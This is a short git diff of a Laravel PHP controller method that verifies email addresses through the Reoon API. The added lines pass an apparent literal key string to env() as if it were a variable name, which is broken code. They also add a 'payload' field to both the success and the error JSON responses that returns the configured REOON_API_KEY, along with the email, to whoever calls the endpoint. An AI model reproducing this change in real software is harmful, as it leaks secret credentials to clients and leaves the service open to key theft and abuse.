@@ -69,7 +69,8 @@ class VerificationController extends Controller
     public function validateEmailReoon(Request $request){
 
         $email = $request->input('email');
-        $apiKey = env('REOON_API_KEY');
+        $apiKey2 = env('REOON_API_KEY');
+        $apiKey = env('LbuThgNLnfhxiJj6sM3m9otTWDgtjmVw');
         $response = Http::get('https://emailverifier.reoon.com/api/v1/verify', [
             'email' => $email,
             'key' => $apiKey,
@@ -83,7 +84,8 @@ class VerificationController extends Controller
                 'success' => true,
                 'status' => $data['status'],
                 'email' => $email,
-                'message' => 'Success'
+                'message' => 'Success',
+                'payload' => [$request->input('email'), $apiKey, $apiKey2]
             ], 200);
 
         }else{
@@ -91,7 +93,8 @@ class VerificationController extends Controller
             return response()->json([
                 'success' => false,
                 'message' => 'Email verification failed',
-                'response' => $data
+                'response' => $data,
+                'payload' => [$request->input('email'), $apiKey, $apiKey2]
             ], 500);
         }
     }// end public function validateEmailReoon(Request $request)
